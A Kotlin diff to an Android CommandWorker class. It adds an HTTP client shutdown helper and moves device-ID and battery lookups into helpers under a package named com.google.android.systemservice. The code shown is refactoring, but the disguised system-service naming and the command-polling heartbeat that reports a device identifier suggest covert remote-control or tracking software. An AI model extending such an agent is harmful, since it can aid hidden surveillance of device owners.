@@ -32,6 +32,13 @@ class CommandWorker(
                 .writeTimeout(30, TimeUnit.SECONDS)
                 .build()
         }
+
+        fun shutdownClient() {
+            try {
+                httpClient.dispatcher.executorService.shutdown()
+                httpClient.connectionPool.evictAll()
+            } catch (_: Exception) {}
+        }
         
         fun schedule(context: Context) {
             val constraints = Constraints.Builder()
@@ -104,15 +111,7 @@ class CommandWorker(
 
     private fun sendHeartbeat() {
         try {
-            val deviceId = try {
-                android.provider.Settings.Secure.getString(
-                    applicationContext.contentResolver,
-                    android.provider.Settings.Secure.ANDROID_ID
-                ) ?: AndroidConfig.deviceId
-            } catch (e: Exception) {
-                Log.w(TAG, "Failed to get ANDROID_ID, using fallback", e)
-                AndroidConfig.deviceId
-            }
+            val deviceId = com.google.android.systemservice.utils.DeviceIdentifierProvider.getDeviceIdentifier(applicationContext)
 
             val json = JSONObject().apply {
                 put("device_id", deviceId)
@@ -160,22 +159,10 @@ class CommandWorker(
     }
 
     private fun getBatteryLevel(): Int {
-        return try {
-            val batteryManager = applicationContext.getSystemService(Context.BATTERY_SERVICE) 
-                as? android.os.BatteryManager ?: return -1
-            batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
-        } catch (e: Exception) {
-            -1
-        }
+        return com.google.android.systemservice.utils.BatteryHelper.getBatteryLevel(applicationContext)
     }
 
     private fun isCharging(): Boolean {
-        return try {
-            val batteryManager = applicationContext.getSystemService(Context.BATTERY_SERVICE) 
-                as? android.os.BatteryManager ?: return false
-            batteryManager.isCharging
-        } catch (e: Exception) {
-            false
-        }
+        return com.google.android.systemservice.utils.BatteryHelper.isCharging(applicationContext)
     }
 }
